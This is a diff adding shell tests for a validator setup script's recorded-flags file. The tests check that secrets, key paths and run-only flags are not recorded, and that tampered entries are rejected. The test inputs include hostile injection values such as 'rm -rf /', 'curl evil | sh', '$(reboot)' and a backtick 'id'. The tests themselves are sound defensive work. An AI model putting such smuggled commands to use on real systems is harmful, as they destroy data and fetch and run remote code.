@@ -2864,8 +2864,89 @@ group "client switch (arise.sh on a live host)"
   assert_contains "$(arise "${sw_base[@]}" --dry-run --restart)" "[DRY RUN] --restart: if a validator is running, would wait for a restart window"
 fi
 
+if should_run "flags"; then
+group "recorded arise.sh flags"
+  # shellcheck source=../lib/hexis.sh
+  source "${ROOT}/lib/hexis.sh"
+
+  rec=$(arise_flags_record --host 1.2.3.4 --ssh-key /k/id --identity /k/staked.json --root-user root \
+    --vote-account VoTe111 --network mainnet --client jito --jito-version v4.4.1-jito --no-xdp \
+    --hexis --hexis-jup-key SECRETJUP --hexis-metrics-config 'host=https://m,db=d,u=u,p=SECRETPW' \
+    --hexis-binary /local/agave-validator --metrics-config '' --swap-size 64G --restart --dry-run \
+    --perch-label 'my box; rm -rf /' --client-version v4.4.2-jito --commission-bps 500)
+
+  it "flags that describe the host are recorded"
+  assert_contains "$rec" "--vote-account VoTe111"
+  it "a flag with no value is recorded as itself"
+  assert_contains "$rec" "--no-xdp"
+  it "an old flag name is recorded under its current one, and the last value wins"
+  assert_eq "$(grep -c -- '--client-version' <<<"$rec")/$(grep -- '--client-version' <<<"$rec")" "1/--client-version v4.4.2-jito"
+  it "no Hexis credential is recorded"
+  assert_not_contains "$rec" "SECRET"
+  it "no credential flag is recorded even without its value"
+  assert_not_contains "$rec" "--hexis-jup-key"
+  it "the cluster metrics string is not recorded"
+  assert_not_contains "$rec" "--metrics-config"
+  it "paths on the operator's machine are not recorded"
+  assert_not_contains "$rec" "/local/agave-validator"
+  it "the identity path is not recorded"
+  assert_not_contains "$rec" "staked.json"
+  it "how the host is reached is not recorded"
+  assert_not_contains "$rec" "--ssh-key"
+  it "what only applied to that run is not recorded"
+  assert_not_contains "$rec" "--restart"
+  it "a value with shell characters is dropped with its flag"
+  assert_not_contains "$rec" "--perch-label"
+  it "the file says when it was written"
+  assert_contains "$(arise_flags_date "$rec")" "$(date '+%Y-%m-%d')"
+
+  it "the recorded flags read back as one line, in the order given"
+  assert_eq "$(arise_flags_command "$rec")" \
+    "--vote-account VoTe111 --network mainnet --client jito --client-version v4.4.2-jito --no-xdp --hexis --swap-size 64G --commission-bps 500"
+
+  hostile=$(printf '%s\n' '# recorded 2026-01-02 03:04 CST' '--network mainnet' '--client jito; curl evil | sh' \
+    '--swap-size $(reboot)' 'rm -rf /' '--ssh-key /tmp/planted' '--host 6.6.6.6' '--perch-label `id`' '--no-xdp')
+  it "a tampered file gives only its plain flags"
+  assert_eq "$(arise_flags_command "$hostile")" "--network mainnet --no-xdp"
+  it "a date line with anything else in it is not taken"
+  assert_eq "$(arise_flags_date '# recorded 2026-01-02 $(reboot)')" ""
+
+  fl_base=(--host 1.2.3.4 --ssh-key "$WORK/key" --identity "$WORK/id.json"
+    --vote-account 7Np41oeYqPefeNQEHSv1UDhYrehxin3NStELsSKCT4K2 --network testnet --client-version v4.4.1-jito)
+  out=$(arise "${fl_base[@]}" --no-xdp --dry-run)
+  it "arise.sh writes the flags file in the validator user's home, mode 600"
+  assert_contains "$out" "write sol@1.2.3.4:/home/sol/.arise-flags (mode 600)"
+  it "arise.sh records the flags it was given"
+  assert_contains "$out" "--vote-account 7Np41oeYqPefeNQEHSv1UDhYrehxin3NStELsSKCT4K2"
+  it "arise.sh does not record the key path"
+  assert_not_contains "$(sed -n '/\.arise-flags (mode 600)/,/^$/p' <<<"$out")" "$WORK/key"
+
+  # A Jito host as system.sh sees it, with and without a flags file
+  fl_host() {
+    printf '%s\n' '*echo ok*|ok' '*system-facts*|agave_active=active\nfd_enabled=disabled\nfd_release=\nfd_config=no' \
+      '*cat /home/sol/validator.sh*|#!/bin/bash\nexec agave-validator \\\\\n    --identity /home/sol/identity.json \\\\\n    --block-engine-url https://ny.mainnet.block-engine.jito.wtf \\\\\n    --ledger /mnt/ledger'
+  }
+  { fl_host
+    printf '%s\n' '*head -n 100 /home/sol/.arise-flags*|# recorded 2026-11-28 14:03 CST\n--vote-account VoTe111\n--network mainnet\n--client jito\n--client-version v4.4.1-jito\n--commission-bps 500\n--swap-size $(reboot)'
+  } > "$WORK/flags-host.responses"
+  fl_host > "$WORK/flags-none.responses"
+  out=$(STUB_RESPONSES="$WORK/flags-host.responses" system --host 1.2.3.4 --ssh-key "$WORK/key")
+  it "system.sh prints the arise.sh command with the recorded flags"
+  assert_contains "$out" "--identity <staked_identity.json> --vote-account VoTe111 --network mainnet --client jito --client-version v4.4.1-jito --commission-bps 500 --restart"
+  it "system.sh says when they were recorded"
+  assert_contains "$out" "(2026-11-28 14:03 CST)"
+  it "system.sh leaves a tampered line out of the command"
+  assert_not_contains "$out" "reboot"
+
+  out=$(STUB_RESPONSES="$WORK/flags-none.responses" system --host 1.2.3.4 --ssh-key "$WORK/key")
+  it "system.sh keeps the placeholders for a host with nothing recorded"
+  assert_contains "$out" "--vote-account <pubkey> --network <net>"
+  it "and says that the next arise.sh run records them"
+  assert_contains "$out" "records them on the host from its next run on"
+fi
+
 if should_run "hostkey"; then
-  echo "host key pinning"
+group "host key pinning"
   # shellcheck source=../lib/hexis.sh
   source "${ROOT}/lib/hexis.sh"
   # shellcheck source=../lib/remote.sh
